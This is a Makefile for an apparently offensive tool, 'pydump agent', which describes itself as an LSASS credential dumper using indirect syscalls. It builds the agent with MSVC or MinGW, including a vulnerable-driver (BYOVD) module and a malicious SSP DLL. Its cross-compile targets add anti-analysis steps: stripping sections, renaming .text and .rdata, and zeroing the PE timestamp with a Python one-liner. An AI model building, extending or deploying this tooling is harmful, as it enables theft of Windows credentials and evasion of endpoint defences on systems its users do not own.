# pydump agent — Native LSASS dumper with indirect syscalls
#
# Build:
#   nmake          (from VS Developer Command Prompt)
#   make cross     (from Linux with x86_64-w64-mingw32-gcc)

# ─── MSVC Build ─────────────────────────────────────────────

CC = cl.exe
ASM = ml64.exe
LINK = link.exe

CFLAGS = /nologo /O1 /GS- /W3 /I include
ASMFLAGS = /nologo /c
LDFLAGS = /nologo /ENTRY:main_entry /SUBSYSTEM:CONSOLE /NODEFAULTLIB

LIBS = ntdll.lib

SRC = src/main.c src/syscalls.c src/dump.c src/pipe.c src/registry.c src/ntfs.c
ASM_SRC = src/syscalls.asm
OBJS = build/main.obj build/syscalls.obj build/dump.obj build/pipe.obj build/registry.obj build/ntfs.obj build/syscalls_asm.obj

OUT = bin/agent.exe

all: dirs $(OUT)

dirs:
	@if not exist build mkdir build
	@if not exist bin mkdir bin

build/main.obj: src/main.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/syscalls.obj: src/syscalls.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/dump.obj: src/dump.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/pipe.obj: src/pipe.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/registry.obj: src/registry.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/ntfs.obj: src/ntfs.c
	$(CC) $(CFLAGS) /c /Fo$@ $**

build/syscalls_asm.obj: src/syscalls.asm
	$(ASM) $(ASMFLAGS) /Fo$@ $**

$(OUT): $(OBJS)
	$(LINK) $(LDFLAGS) /OUT:$@ $** $(LIBS)

clean:
	@if exist build rmdir /s /q build
	@if exist bin rmdir /s /q bin

# ─── MinGW Cross-Compilation (from Linux) ───────────────────

CROSS_CC = x86_64-w64-mingw32-gcc
CROSS_OBJCOPY = x86_64-w64-mingw32-objcopy
CROSS_CFLAGS = -O1 -nostdlib -Iinclude -Wall -fno-ident -fomit-frame-pointer -mno-stack-arg-probe
CROSS_LDFLAGS = -nostartfiles -nodefaultlibs -e main_entry -s

cross: dirs_cross
	nasm -f win64 src/syscalls.asm -o build/syscalls_asm.o 2>/dev/null || \
		$(CROSS_CC) -c src/syscalls_gas.S -o build/syscalls_asm.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/main.c -o build/main.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/syscalls.c -o build/syscalls.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/dump.c -o build/dump.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/pipe.c -o build/pipe.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/registry.c -o build/registry.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/ntfs.c -o build/ntfs.o
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/byovd.c -o build/byovd.o
	$(CROSS_CC) -o bin/agent.exe build/main.o build/syscalls.o build/dump.o build/pipe.o build/registry.o build/ntfs.o build/byovd.o build/syscalls_asm.o $(CROSS_LDFLAGS)
	$(CROSS_OBJCOPY) --remove-section .comment bin/agent.exe 2>/dev/null || true
	$(CROSS_OBJCOPY) --rename-section .text=.code --rename-section .rdata=.cfg bin/agent.exe 2>/dev/null || true
	python3 -c "import struct;f=open('bin/agent.exe','r+b');f.seek(0x3c);off=struct.unpack('<I',f.read(4))[0]+8;f.seek(off);f.write(b'\0\0\0\0');f.close()"

cross_ssp: dirs_cross
	$(CROSS_CC) $(CROSS_CFLAGS) -c src/ssp.c -o build/ssp.o
	$(CROSS_CC) -shared -nostdlib -nostartfiles -o bin/ssp.dll build/ssp.o -s -Wl,-e,DllMain
	$(CROSS_OBJCOPY) --remove-section .comment bin/ssp.dll 2>/dev/null || true
	python3 -c "import struct;f=open('bin/ssp.dll','r+b');f.seek(0x3c);off=struct.unpack('<I',f.read(4))[0]+8;f.seek(off);f.write(b'\0\0\0\0');f.close()"

cross_all: cross cross_ssp

dirs_cross:
	@mkdir -p build bin

.PHONY: all clean cross cross_ssp cross_all dirs dirs_cross
